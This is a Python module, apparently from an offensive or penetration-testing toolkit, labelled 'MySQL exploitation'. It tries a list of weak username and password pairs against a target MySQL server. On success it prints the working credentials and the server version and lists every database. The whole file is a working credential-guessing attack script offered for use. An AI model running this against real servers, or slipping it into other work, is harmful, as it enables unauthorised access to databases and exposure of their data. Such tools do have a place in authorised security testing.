"""MySQL exploitation"""

from ..config import MYSQL_CREDENTIALS, DEFAULT_TIMEOUT

def exploit_mysql_weak_creds(target, port=3306):
    """
    Test MySQL with weak credentials
    Returns: Result dict or None
    """
    print(f"\n[*] Testing MySQL on {target}:{port}")
    
    try:
        import mysql.connector
    except ImportError:
        print("    [!] mysql-connector-python not installed")
        print("    [!] Install: pip3 install mysql-connector-python")
        return None
    
    credentials = MYSQL_CREDENTIALS
    
    for username, password in credentials:
        try:
            conn = mysql.connector.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connection_timeout=DEFAULT_TIMEOUT
            )
            
            print(f"    [+] SUCCESS! {username}:{password}")
            
            # Get version
            cursor = conn.cursor()
            cursor.execute("SELECT VERSION()")
            version = cursor.fetchone()[0]
            
            print(f"    [+] MySQL Version: {version}")
            
            # List databases
            cursor.execute("SHOW DATABASES")
            databases = [db[0] for db in cursor.fetchall()]
            
            print(f"    [+] Databases: {', '.join(databases)}")
            
            conn.close()
            
            return {
                'service': 'MySQL',
                'port': port,
                'username': username,
                'password': password,
                'version': version,
                'databases': databases,
                'status': 'success'
            }
            
        except mysql.connector.Error:
            pass
        except Exception as e:
            pass
    
    print("    [-] No valid credentials found")
    return None